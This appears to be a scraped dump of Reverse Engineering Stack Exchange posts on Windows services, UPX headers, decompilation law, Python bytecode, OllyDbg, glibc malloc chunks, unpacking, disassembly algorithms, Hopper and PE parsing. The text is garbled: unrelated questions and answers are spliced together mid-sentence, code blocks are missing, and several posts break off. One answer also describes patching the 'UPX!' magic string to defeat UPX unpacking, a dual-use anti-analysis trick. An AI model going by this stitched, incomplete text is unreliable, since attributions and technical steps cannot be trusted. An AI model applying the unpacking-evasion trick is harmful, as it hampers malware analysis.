<p>You don't communicate ""Start"" to a service. Whenever a service loads, it loads in the ""started"" state. It is service's responsibility to report its state to the SCM. You can PAUSE it or CONTINUE (plus about dozen more control codes). You communicate it to the SCM by using <strong><code>ControlService()</code></strong>(<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682108%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">MSDN</a>) function. The SCM in turn relays the control code (e.g. SERVICE_CONTROL_PAUSE, SERVICE_CONTROL_CONTINUE or any other one) through to the service using registered service control handler function. Afterwards, it is the services responsibility to act upon received control code.</p>

<p>I don't think services.exe executes or runs threads behind actual services. It is the SCM itself. I take it coordinates services in general. Each service ""lives"" in svchost.exe instance. Taking mentioned above into account, I could assume that Service Entry Point or Service Main is executed in the context of instance of the svchost.exe. In its turn, svchost.exe executes Service Main in context of main thread, blocking main thread until Service Main exists signaling that the service exited.</p>

<p>If you are thinking to create your own service control manager, there is no need to reverse engineer how services.exe does it. You can do it your own way and anyway that you like it :)</p>

<p>I hope it helps.</p>

<p><strong>ADDED:</strong></p>

<p>As <a href=""https://reverseengineering.stackexchange.com/users/161/mick"">Mick</a> commented below, <strong><code>services.exe</code></strong> is the Service Control Manager itself. </p>

<p>If you are creating your own service wrapper to run existing serivce executables outside of the SCM, you will have to adhere to above mentioned service quidelines and requirements. The fist requirement is for the service to get itself registered with the SCM and provide Service Main Entry Point, which is done by calling <strong><code>StartServiceCtrlDispatcher()</code></strong>. It will get you the entry point to Service Main. Afterwards, you should expect the Service Main to call <strong><code>RegisterServiceCtrlHandler()</code></strong> and <strong><code>SetServiceStatus()</code></strong>. Since <strong><code>RegisterServiceCtrlHandler()</code></strong> runs in context of Service Main and blocks Service Main thread, it should be handled properly as well. In addition, you should think of a way to control/monitor the service worker thread(s) by ""watching"" for <strong><code>CreatThread()</code></strong>(<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682453%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">MSDN</a>) within Service Main. </p>

"Decoding the UPX ELF header file","4229","","<p>Still on my way to understand how to prevent the usage of the <code>-d</code> (decompress) option of UPX (see this <a href=""https://reverseengineering.stackexchange.com/questions/3323/how-to-prevent-upx-d-on-an-upx-packed-executable"">question</a>), I try to identify the header file of UPX in ELF executable files.</p>

<p>Looking at the code, all the sources seems to be in the files <code>lx_elf.h</code> and <code>lx_elf.cpp</code> (stands for <em>Linux Elf</em>). I tried to follow the code but I got lost in it...</p>

<p>I also did take a look at the beginning of an UPX compressed executable file (amd64), visualized in 8-bytes per line mode for more clarity (and thanks to <a href=""http://code.google.com/p/corkami/wiki/ELF101"" rel=""nofollow noreferrer"">Corkami ELF-101</a>):</p>

<p>A few fields have been omitted in the compressed version but the header is mainly preserved. So, lets assume this is just a short version of the original ELF header.</p>

<p>But, what I would like to understand are the fields of the first header:</p>

<p>So, my question is about discovering the location and the meaning of the fields of the UPX header. If somebody knows about UPX internals any hint would be appreciated.</p>
","<p>It's very easy to prevent the UPX tool to unpack an UPX compressed file. If you take a look to the source code you will see that it checks for the magic string <code>UPX_MAGIC_LE32</code> in <code>p_lx_interp.cpp</code>. So, I simply changed all matches of the string (in binary chunks) ""<code>UPX!</code>"" to ""<code>AAA!</code>"". I copied <code>/bin/ls</code> (ELF64) to another folder and packed with UPX. Then I edited it like this:</p>

"Legality of Decompilation","4197","","<p>How ""legal"" is it to read and edit .exe files, .dll files, and other compiled source files? Decompilation is taking the compiled code of a program, often minified and obfuscated, and trying to get the original source code back as it was written, or at least get it in a form a person could read. There are various reasons a person or company would make its code harder to read while compiling it, but the 2 I've seen most often have to do with saving resources, like space, RAM, power, etc., and making it so the code is harder to read so the user can not see what it does as easily. As we are a community about questioning the practices of reverse engineering, I think it's safe to say most of us don't like the second reason. I am asking for facts here, though, not opinions.</p>

<p>Because this question could get very broad, I will limit this to laws in particular countries and rules of various influential or popular companies, but info about generalities is also welcome. I am definitely not asking about morals/ethics, although I know those will certainly come up.</p>

<p>There was already <a href=""https://reverseengineering.stackexchange.com/questions/60/is-reverse-engineering-and-using-parts-of-a-closed-source-application-legal"">a question about the legality of reverse engineering in general</a>, but I'm talking only about decompilation here. As the answers to this question stated, decompilation is one type of reverse engineering. As far as I could tell, the other question didn't get answers about decompilation specifically, though you are free to provide these yourself. One answer did say the question was too broad, but perhaps this question will have a better scope.</p>
","<p>Legality of decompilation depends on the <code>EULA</code> (End User License Agreement) of the binary you wish to work with. While Open Source License Agreements like <code>GPL</code> may allow to edit/decompile the binary, other closed source proprietary agreements will prevent you in most cases.</p>

<p>That being said decompiling is always legal to somewhat a limited extend according to copyright laws of Europe and the US.</p>

<p>If I want to look at the bytecode (not a disassembly using dis), I can typically use <code>h.func_code.co_code</code>. Is there any other way to look at the bytecode? This particular application was packaged with a custom python interpreter (using py2exe probably) which removed access to co_code. I can't just look at the pyc file as they are encrypted.</p>

<p>For example, in the interpreter, if I just type <code>h</code> without making it a function call, I get the address of the function. Can I use that address to get the bytecode? Is there some other way?</p>

<p>P.S. My original goal in doing this at the time was to use pyREtic (which calls co_code) to decompile. Since it called co_code, it would fail to work. I figured out one way to do it which I will post as an answer eventually. Wanted to see what others have done or come up with.</p>
","<p>First, just a small reminder about ""what is <code>co_code</code>"".</p>

<p>In Python, every element of the language (functions, methods, classes, ...) is defined and stored in an object. The <code>co_code</code> is one of the fields attached to the class used to represent a function or a method.  Lets practice a bit with Python 2.7.</p>

<pre><code>$&gt; python2.7
Python 2.7.3 (default, Mar  4 2013, 14:57:34) 
[GCC 4.7.2] on linux2

&gt;&gt;&gt; def foo():
...     print('Hello World!')
... 
&gt;&gt;&gt; dir(foo.__code__)

['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', 
 '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', 
 '__new__',  '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', 
 '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 
 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 
 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
&gt;&gt;&gt; foo.__code__.co_code
'd\x01\x00GHd\x00\x00S'
</code></pre>

<p>So, you can see that the <code>co_code</code> field contain the compiled bytecode of the function we just defined previously. In fact, it seems that <code>co_code</code> is just a buffer to store the compiled bytecode in a lazy manner. It is compiled only when it is accessed for the first time.</p>

<p>Assuming this, the <code>co_code</code> is just a unified helper to access the bytecode which might be stored in several forms. One form are the <code>*.pyc</code> files which are storing the compiled Python bytecode of a whole file. Another form is just the on-the-fly compilation of the function/method.</p>

<p>Nevertheless, there is a way to access directly the function/method definition and, thus, to the bytecode. The point is to intercept the Python process with <code>gdb</code> and analyze it. A few tutorials exists in the web about this (see <a href=""http://grapsus.net/blog/post/Low-level-Python-debugging-with-GDB"">here</a>, <a href=""http://docs.python.org/devguide/gdb.html"">here</a>, <a href=""http://www.jmcneil.net/2012/04/debugging-your-python-with-gdb-ftw/"">here</a> or <a href=""http://chrismiles.livejournal.com/20226.html"">here</a>). But, here is a quick example (you need to install the <code>python-gdb</code> package first):</p>

<p>So, here is the way to access directly the bytecode, given the address of the function.</p>

<p>Just to try to  be complete, the best documentation I found on Python bytecode (and how to access it), is the Python code itself and especially the <code>inspect</code> module (<a href=""http://hg.python.org/cpython/file/2.7/Lib/inspect.py"">2.7</a>, <a href=""http://hg.python.org/cpython/file/3.2/Lib/inspect.py"">3.2</a>). Try to look at it, it is quite instructive.</p>

<p>Another help you can use is the <a href=""http://docs.python.org/2/library/dis.html""><code>dis</code> module</a> that provide a disassembler for the Python bytecode. Here is an example of what can do this disassembler.</p>

"Viewing an exported DLL function in OllyDbg - garbage code","4134","","<p>Being rather new to the concept of RE, I wanted to try and take a look at the assembly code in one DLL that I know exports some functions.</p>

<p>First, I used this tool - <a href=""http://www.nirsoft.net/utils/dll_export_viewer.html"" rel=""nofollow"">http://www.nirsoft.net/utils/dll_export_viewer.html</a> - to obtain a list of exports within said DLL. These are some of the functions:</p>

<pre><code>GI_Call 0x100590a7  0x000590a7  2 (0x2) mydll.dll   I:\test\mydll.dll   Exported Function   
GI_CleanReturnStack 0x10058eae  0x00058eae  3 (0x3) mydll.dll  I:\test\mydll.dll    Exported Function   
GI_Cmd_Argc 0x10058bd4  0x00058bd4  4 (0x4) mydll.dll   I:\test\mydll.dll   Exported Function   
GI_Cmd_Argc_sv  0x10059593  0x00059593  5 (0x5) mydll.dll   I:\test\mydll.dll   Exported Function   
</code></pre>

<p>When I, however, load the DLL up in OllyDbg and browse to any of these addresses, I get instructions that don't really resemble a beginning of a function, for example GI_Call:</p>

<pre><code>100590A7     10E9                ADC CL,CH
100590A9     CE                  INTO

<pre><code>100590A7     10E9                ADC CL,CH
</code></pre>

<p>anymore, it changes to a completely different instruction, also that address is gone.</p>

<p>Am I doing something wrong? Or is the DLL possibly encrypted? Though if it is, how could DLL Export Viewer dump the exports so easily?</p>
","<p>Your library might get loaded to a location that's completely different from the one it wants to be loaded at, i.e. the address in the header, due to <a href=""http://en.wikipedia.org/wiki/Address_space_layout_randomization"" rel=""nofollow"">ASLR</a>.</p>

<p>Also, when loading a DLL, Ollydbg doesn't load the DLL directly; instead, it uses <code>loaddll.exe</code>. Which means, it starts the executable, but the breakpoint it sets is <em>before</em> <code>loaddll</code> has a chance to, well, load the DLL.</p>

<p>Try the following:</p>

<ul>
<li>Set a breakpoint on <code>LoadLibraryA</code> : right click in CPU Window - Go To - Expression - <code>LoadLibraryA</code> - Press <kbd>F2</kbd>;</li>
<li>Repeat the same with LoadLibraryW (the A version should be sufficient, just to make sure);</li>
<li>Run the program;</li>
<li>Once your breakpoint is it, press <kbd>CTRL</kbd>-<kbd>F9</kbd> (execute till return);</li>
<li>If your DLL depends on others, you'll hit one of your breakpoints again; else you'll hit the breakpoint at the <code>RET</code> instruction. Don't worry, in either case, your DLL will be loaded;</li>
<li>Use View->Memory or View->Executable Modules to learn where your DLL was actually loaded. This may be the same address that DLL Export Viewer shows you, but often, it will be different (address conflicts between two DLLs, in which case one has to be relocated, or ASLR, as above);</li>
<li>Only if the addresses match: Right Click -> GoTo -> Expression -> <code>0x12345678</code> or whatever address you want to see;</li>
<li>No matter if they match or not: Right Click -> GoTo -> Expression -> (Function name) will scroll to that function.</li>
</ul>

<p>The reason for your '<em>disappearing</em>' instruction is that it's the middle of another instruction. Consider this function start:</p>

<pre><code>10001280 &gt; 53               PUSH EBX

<p>The byte at <code>10001284</code>, <code>0x7c</code>, is part of the instruction at <code>1001283</code>. But if you disassemble from <code>10001284</code>,</p>

<p>All of that stuff does not make much sense for me, that's why I was wondering wether you could give me some clues about all of this or not. Does the Doug Lea's implementation still exist in recent glibc versions, or...?</p>
","<p>First of all, I have bad news for you ! Doug Lea's malloc is almost no more used in any C library implementation (even if understanding <code>dlmalloc</code> can help a lot to understand new ones).</p>

<p>The new implementation that is most widely used is <code>ptmalloc2</code> and the best way to learn about it is... to read the code... So, if you are using a Debian(-like) distribution, just like me, you just need to get the source code of the libc like this:</p>

<pre><code>$&gt; apt-get source libc6
</code></pre>

<p>Note that the <a href=""http://lwn.net/Articles/488778/"" rel=""nofollow noreferrer"">glibc is no more</a> and has been subsumed by the <a href=""http://www.eglibc.org/home"" rel=""nofollow noreferrer"">eglibc project</a>. The Debian distribution switched to eglibc some time ago (see <a href=""http://blog.aurel32.net/47"" rel=""nofollow noreferrer"">here</a> and <a href=""http://lwn.net/Articles/332000/"" rel=""nofollow noreferrer"">there</a> and even on the <a href=""http://packages.qa.debian.org/g/glibc.html"" rel=""nofollow noreferrer"">glibc source package page</a>). So, the implementation of <code>malloc</code> has changed considerably (and some security safeties have been added since <code>dlmalloc</code>).</p>

<p>But, let see what does look like the <code>malloc</code> implementation:</p>

<pre><code>$&gt; cd eglibc-2.17/malloc/
$&gt; less malloc.c

...
/*
 This is a version (aka ptmalloc2) of malloc/free/realloc written by
 Doug Lea and adapted to multiple threads/arenas by Wolfram Gloger.

 There have been substantial changesmade after the integration into
 glibc in all parts of the code.  Do not look for much commonality
 with the ptmalloc2 version.
...
</code></pre>

<p>As I said, the algorithm used here is <code>ptmalloc2</code> (POSIX Threads Malloc), but with significant modifications. So, you'd better read the code to know better about it.</p>

<p>But, to sum up a bit, the heap memory is managed through memory chunks which are prefixed by meta-data gathering these information (I am just quoting comments that are in the <code>malloc.c</code> source file, refer to the whole file for more):</p>

<pre><code>/*
   malloc_chunk details:

    (The following includes lightly edited explanations by Colin Plumb.)

    Chunks of memory are maintained using a `boundary tag' method as
    described in e.g., Knuth or Standish.  (See the paper by Paul
    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a
    survey of such techniques.)  Sizes of free chunks are stored both
    in the front of each chunk and at the end.  This makes
    consolidating fragmented chunks into bigger chunks very fast. The
    size fields also hold bits representing whether chunks are free or
    in use.

    An allocated chunk looks like this:


    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if allocated            | |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                       |M|P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk                                     |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


    Where ""chunk"" is the front of the chunk for the purpose of most of
    the malloc code, but ""mem"" is the pointer that is returned to the
    user.  ""Nextchunk"" is the beginning of the next contiguous chunk.

    Chunks always begin on even word boundries, so the mem portion
    (which is returned to the user) is also on an even word boundary, and
    thus at least double-word aligned.

    Free chunks are stored in circular doubly-linked lists, and look like this:

    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk                            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                         |P|
      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

    The P (PREV_INUSE) bit, stored in the unused low-order bit of the
    chunk size (which is always a multiple of two words), is an in-use
    bit for the *previous* chunk.  If that bit is *clear*, then the
    word before the current chunk size contains the previous chunk
    size, and can be used to find the front of the previous chunk.
    The very first chunk allocated always has this bit set,
    preventing access to non-existent (or non-owned) memory. If
    prev_inuse is set for any given chunk, then you CANNOT determine
    the size of the previous chunk, and might even get a memory
    addressing fault when trying to do so.

    Note that the `foot' of the current chunk is actually represented
    as the prev_size of the NEXT chunk. This makes it easier to
    deal with alignments etc but can be very confusing when trying
    to extend or adapt this code.

    The two exceptions to all this are

     1. The special chunk `top' doesn't bother using the
        trailing size field since there is no next contiguous chunk
        that would have to index off it. After initialization, `top'
        is forced to always exist.  If it would become less than
        MINSIZE bytes long, it is replenished.

     2. Chunks allocated via mmap, which have the second-lowest-order
        bit M (IS_MMAPPED) set in their size fields.  Because they are
        allocated one-by-one, each must contain its own trailing size field.

"How to unpack files packed with multiple packers?","4077","","<p>As I am just getting started in RE, I've mostly faced files packed with a single-layer of packing , such as UPX, ASPack, etc.</p>

<p>Unpacking these protections is fully documented online. The problem begins when I deal with <strong>multiple layers of packing</strong>, especially concerning malware. I have followed some tutorials though they're usually not detailed enough. They seem to go through a <strong>tedious process</strong> to find the OEP. For example, they start by dealing with common packers (which is the easy part) and then they begin to set breakpoints everywhere ""<strong>in calls and jumps</strong>"" and tracing through the file here and there, which is for me the <strong>hard part</strong> that I have described above. At this point, I have no clue for what they are seeking or for what they are aiming, and then after some work, they find the OEP!  </p>

<p>So what logic did they follow in that process? Also, because I know that the subject is broad, I'm also interested in some keywords.</p>

My advice to you is :</p>

<li>read the tutorial several times and try to pass it without looking into the writings</li>
<li>try to understand as much as you can about OS/platform you are reversing on</li>
<li>be proficient with PE format for a start or the file format you are dealing with</li>
<li>read about packers and obfuscation techniques</li>

"What is the algorithm used in Recursive Traversal disassembly?","4046","","<p>Disassembling binary code is a quite difficult topic, but for now only two (naive) algorithms seems to be broadly used in the tools.</p>

<ul>
<li><strong>Linear Sweep</strong>: A basic algorithm taking all the section marked as <em>code</em> and disassembling it by reading the instructions one after each other.</li>
<li><strong>Recursive Traversal</strong>: Refine the linear sweep by remembering when (and where) a <code>call</code> has been taken and returning to the last <code>call</code> when encountering a <code>ret</code>.</li>
</ul>

<p>Yet, the description of these algorithms are quite vague. In real-life tools, they have been a bit refined to improve the accuracy of the disassembling. </p>

<p>For example, <code>objdump</code> perform a linear sweep but will start from all the symbols (and not only the beginning of the sections marked as <code>code</code>.</p>

<p>So, can somebody give a more realistic description of the recursive traversal algorithm (<em>e.g.</em> as it is coded in IDAPro) ?</p>
","<p>I have decided to post my answer not to overthrow Igor's answer, but to have an addition to it. I was not comfortable with editing his post either. I am pretty new to the forum and not sure how it is taken by other members. </p>

<p>There is a little theory I have recently learned, which I would like to share. Anyways, what I have taken in about IDA Pro from <a href=""http://nostarch.com/idapro.htm"">The IDA Pro Book</a> (Part I, Section 1) is that it uses <strong><code>Recursive Descent Disassembly</code></strong>, which is based on the concept of control flow. The key element to this approach is the analysis of each instruction in order to determine if it is referenced from any other location. Each instruction is classified according to how it interacts with EIP. There are several main classifications:</p>

<ol>
<li><strong>Sequential Flow Instuctions</strong>. Those are instruction that pass execution to the next instruction to follow such as <code>add</code>, <code>mov</code>, <code>push</code>, <code>pop</code>, etc. Those instructions are disassembled with <strong>linear sweep</strong></li>
<li><strong>Conditional Branching Instructions</strong>. Those are <em>True/False</em> conditional instructions such as <code>je</code> and such. Conditional instructions only offer 2 possible branches of execution. If condition is <em>False</em> and jump is not taken disassembler proceeds with <strong>linear sweep</strong>, and adds jump target instruction to a list of deferred code to be disassembled at later time using <strong>recursive descent algorithm</strong></li>
<li><strong>Unconditional Branching Instructions</strong>. Those instruction can cause particular problems for recursive descent disassemblers in case the jump target is calculated at runtime. Unconditional branches do not follow linear flow. If possible, disassembler will attempt to add the target of the unconditional jump for further analysis. If target is not determined, there is going to be no disassembly for the particular branch.</li>
<li><strong>Function Call Instructions</strong>. Call instructions are mostly treated as Unconditional Branching Instructions with expectation that execution would return to the instruction following the call as soon as function completes. The target address address of the call instruction is queued for deferred disassembly, and the instruction following the call is processed as linear sweep. However, it is not always possible to determine target of the call (e.g. <code>call eax</code>). </li>
<li><strong>Return Instructions</strong> Return instructions do not offer any information to disassembler about what to execute next. Disassemblers cannot pop the return address from the top of the stack. All of that brings disassembler to stop. At this point disassembler turns to the saved list of deferred targets to follow next. That is exactly why it is called <strong><em>recursive</em></strong>.</li>
</ol>

<p>To summarize, I would like to quote <a href=""http://nostarch.com/idapro.htm"">The IDA Pro Book</a>:</p>

<blockquote>
  <p>One of the principle advantages of the recursive descent algorithm is its superior ability to distinguish code from data. As a control flow-based algorithm, it is much less likely to incorrectly disassemble data values as code. The main disadvantage of recursive descent is the inability to follow indirect code paths, such as jumps or calls, which utilize tables of pointers to look up a target address. However, with the addition of some heuristics to identify pointers to code, recursive descent disassemblers can provide very complete code coverage and excellent recognition of code versus data.</p>

"How is Hopper on Windows or Linux?","3987","","<p><a href=""http://www.hopperapp.com/"" rel=""nofollow"">Hopper</a> seems to be focused on Mac, but how does its capabilities on Windows or Linux compares with the free version of IDA for reversing x86/x64 executables?  </p>

<p><a href=""http://www.hopperapp.com/"" rel=""nofollow"">Hopper</a> seems to have all the major features IDA has; a graph view, ability to rename objects, and a Python API, yet IDA is still the standard.</p>

<p>Are these features in Hopper as effective as in IDA? Are there any known deficiencies in Hopper? </p>
","<p>I am using IDA for about 10 years and I have been using Hopper for a few months (on Kubuntu and Windows).</p>

<p>It depends what you want to do, what budget you have and whether it's hobby or professional.</p>

<p>Clearly, IDA is more powerful in most aspects. It supports a wider ranger of processors, has more loaders and a plugin system as well as two powerful scripting languages (IDC/Python).</p>

<p>Given the price tag, Hopper is <strong>well worth</strong> the purchase. Indeed, I can confirm that the decompiler is more simplistic than even the Hex-Rays decompiler in its beta some years back (I have never used it again since then). If someone wants to start with reverse engineering, I am clearly recommending IDA Freeware for those that work only with Windows PE files (and outside a commercial context) and Hopper if the hobbyist is willing to shell out a few bucks.</p>

<p>There are a few things to consider: do you look for a decompiler or a disassembler and what's your budget? From daily use I'd say that the disassembler for x86 and x64 is pretty much equivalent for ELF (Linux) and PE (Windows) files from my point of view.</p>

<p>All features in Hopper seem to function as well as you'd expect from a fairly new product (meaning the time of development that went into it overall) and the price tag. It is being improved all the time, so you'll be able to get feature updates.</p>

<p>However, the biggest - by far - <strong>disadvantage</strong> for me is the ""learning curve"". A lot of the features in Hopper have different shortcuts or slightly different work flows, but one can clearly see how the author must be aware of IDA and recent developments in IDA (notably since about IDA version 5.0). Although I come from the other side, I think someone starting with Hopper will benefit from it when later going professional and switching to paid IDA.</p>

<hr>

<p>Last but not least a note about decompilers. Being more acquainted with disassemblers I actually found results of Hex-Rays confusing and ambiguous in many cases in the past. The same holds for decompilation results of Hopper. If you are a seasoned reverser, disassembly sometimes tends to be ""clearer"" (albeit less convenient) the more experience you have.</p>

"Why there are not any disassemblers that can generate re-assemblable asm code?","3920","","<p>I am struggling on this problem for around three months:</p>

<p><em>How to use disassemblers (IDA Pro and others...) to generate re-assemblable asm code and assemble it back</em></p>

<p>My experience is that:</p>

<ol>
<li><p>There is NO tool that can generate re-assemblable asm code on 32-bit x86.</p></li>
<li><p>You need to adjust/heuristically modify the asm code created by IDA Pro to make it re-assemblable.</p></li>
<li><p>It is doable to <strong>automatically</strong> adjust/heuristically modify process on <strong>benign program</strong> (one without obfuscation).</p></li>
<li><p>It is very tedious, and VS compiled PE binary is much more complex than GCC compiled ELF binary.</p></li>
</ol>

<p>So my questions are:</p>

<ol>
<li><p>Why there are not any disassemblers that can generate re-assemblable asm code targeting on <strong>benign program</strong> (one without obfuscation) ?</p></li>
<li><p>If I want to implement such a tool (without the help of IDA Pro, sketching from the beginning), is it possible?</p></li>
<li><p>Are there any other concerns related to this that I may have missed?</p></li>
</ol>
","<h2><strong>Because this is really hard to do.</strong></h2>

<p>To elaborate:</p>

<p>You'll also need to extract things that are not code. Think of import tables, export tables, strings and other data. </p>

<p>When you write code, this is only one part of the program. The other part is the Compiler Optimizations and data section. This makes it almost impossible to create re-compilable assembly. If you want to edit a program on assembly level I'd recommend to use windbg and LordPE.</p>

","<p>The <code>.bss</code> has no content. It's simply a tip to the loader to preallocate some space when starting the program.

This step will be different depending on if the executable has or hasn't been mapped into memory, but the basic idea will be the same. Assuming that you are interested in doing this for a file on disk, then you may do this with the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa366556(v=vs.85).aspx"" rel=""nofollow noreferrer"">file mapping API</a>, if you would prefer to implement this on an executable loaded into memory as a running process, you can achieve the equivalent by using the the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms686849(v=vs.85).aspx"" rel=""nofollow noreferrer"">tool help snapshot API</a>.

<p>Once you have completed the first step, the structure at the base address is the <a href=""https://stackoverflow.com/questions/6126980/get-pointer-to-image-dos-header-with-getmodulehandle""><code>IMAGE_DOS_HEADER</code></a>, while this is not documented on MSDN, it has two very important but cryptic fields.  The two fields you will need to know are the <code>e_magic</code> field and the <code>e_lfanew</code> field. The <code>e_magic</code> field contains a double word for 32-bit or quadruple for 64-bit that allows you to test if the file being read or your implementation is correctly formatted with the correct value being defined as <code>IMAGE_DOS_SIGNATURE</code>, which is the ASCII-Z string of ""MZ\0"". The <code>e_lfanew</code> field contains a <a href=""https://stackoverflow.com/questions/2170843/va-virtual-adress-rva-relative-virtual-address"">relative virtual address</a> which you need to add to the image base you found in step one to calculate the <a href=""https://stackoverflow.com/questions/2170843/va-virtual-adress-rva-relative-virtual-address"">virtual address</a> of the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680336(v=vs.85).aspx"" rel=""nofollow noreferrer""><code>IMAGE_NT_HEADERS</code></a> structure.</p>

<p>The third step will be to check the first member of the <code>IMAGE_NT_HEADERS</code> to see if it is an actual PE file, this will be defined by the <code>Signature</code> field of the structure, and the defined constant to test for will be <a href=""http://win32assembly.programminghorizon.com/pe-tut2.html"" rel=""nofollow noreferrer""><code>IMAGE_NT_SIGNATURE</code></a>. This is not typically nessecary, since most Windows versions will be using the PE format of executable file, but it's good practice in order to ensure your code is a bit more robust.</p>

The IMAGE_SECTION_HEADER structures are stored as an array in the file, so to obtain the size of the array, you will need to use the <code>NumberOfSections</code> member in the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680313(v=vs.85).aspx"" rel=""nofollow noreferrer""><code>IMAGE_FILE_HEADER</code></a> structure which is nested in the <code>IMAGE_NT_HEADERS</code> structure mentioned above.Once you have that value, you may find the virtual address of the first <code>IMAGE_SECTION_HEADER</code> by adding the size of the <code>Signature</code> member of the <code>IMAGE_NT_HEADERS</code> structure, the size of the <code>FileHeader</code> member in the <code>IMAGE_NT_HEADERS</code> structure, and finally the <code>SizeOfOptionalHeader</code> value in the <code>IMAGE_FILE_HEADER</code> structure. The reason you can't simply do a <code>sizeof(</code> <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680339(v=vs.85).aspx"" rel=""nofollow noreferrer""><code>IMAGE_OPTIONAL_HEADER</code></a> <code>)</code> for the last value in the formula listed above is because a file on disk <strong><em>will not</em></strong> have the <code>IMAGE_OPTIONAL_HEADER</code>, so to obtain the proper size dynamically, you should do so through the structure member I mentioned earlier.</p>

<p>Now you may simply copy the array of <code>IMAGE_SECTION_HEADER</code> structures from memory any way you please. Just remember, that these structures <em>are contigous</em> in memory, so all you need to do is multiply the size of each structure by the number of sections to find the total size of the entire array in memory. After you have calculate that value, it will be trivial to collect the data.</p>

"Using IDA Python Iterate Through All Functions and Their Instructions","3784","","<p>I'm new to IDAPython. Basically I want to iterate through all functions in an IDB file and their instructions using ida python script. The final goal is to export the functions &amp; their instructions from idapro. in certain format.</p>

<pre><code>from idautils import *
from idaapi import *

ea = BeginEA()
for funcea in Functions(SegStart(ea), SegEnd(ea)):
    functionName = GetFunctionName(funcea)
    print functionName
</code></pre>

<p>Using above script I'm retrieving function names, now I also want to print the assembly instructions of each function. I know may I have to use GetDisasm(ea), not sure how to use the API.</p>

<p>TIA</p>
","<p>Please note that it will print only those functions that were recognized as such by IDA autoanalysis or defined manually, exactly as your code snippet. This snippet is not debugged, use on your own risk.</p>

<pre><code>from idautils import *
from idaapi import *
from idc import *

for segea in Segments():
    for funcea in Functions(segea, SegEnd(segea)):
        functionName = GetFunctionName(funcea)
        for (startea, endea) in Chunks(funcea):
            for head in Heads(startea, endea):
                print functionName, "":"", ""0x%08x""%(head), "":"", GetDisasm(head)
</code></pre>

<p>If you want to extract the instructions as binary you can use <code>idc.NextHead</code> function to get instruction boundaries.</p>

<p>The function chunks mentioned in the code are not the same as we see in the the graph view in IDA (the function has more than one chunk if it is discontinuous
): chunks in graph view are called <a href=""https://en.wikipedia.org/wiki/Basic_block"" rel=""nofollow noreferrer"">""basic blocks""</a>, see more correct definition by the link.</p>

"How can I view FS:[0] with windbg?","3769","","<p>It seems that Windows 8 broke Ollydbg as several <code>ntdll</code> functions keep throwing exception <code>0xC0000008</code> and crashing my debugger.</p>

"What is the difference between static disassembly and dynamic disassembly?","3749","","<p>I am told that tools like <strong>IDA Pro</strong> are static disassembly tool,

<p>But from the using experiences on these tools, I don't think there 
is any difference between the tools in <strong>disassembly</strong> procedure.</p>

<p>Basically all you need to do is load binary file into IDA or OllyDbg, 
and they will use certain recursive disassembly algorithm to disassembly
the binary and give you the output.</p>

<p>Am I wrong..? Then what is the difference between static disassembly 
and dynamic disassembly..?</p>

<p>Thank you!</p>
","<p>You have a mix up here. There is no such thing as dynamic disassembly and static disassembly but rather <a href=""http://en.wikipedia.org/wiki/Dynamic_program_analysis"">dynamic</a> </p>

<blockquote>
  <p>Dynamic program analysis is the analysis of computer software that is performed by executing programs on a real or virtual processor.</p>
</blockquote>

<p>and <a href=""http://en.wikipedia.org/wiki/Static_program_analysis"">static analysis</a> of a binary. </p>

<blockquote>
  <p>Static program analysis is the analysis of computer software that is performed without actually executing programs</p>

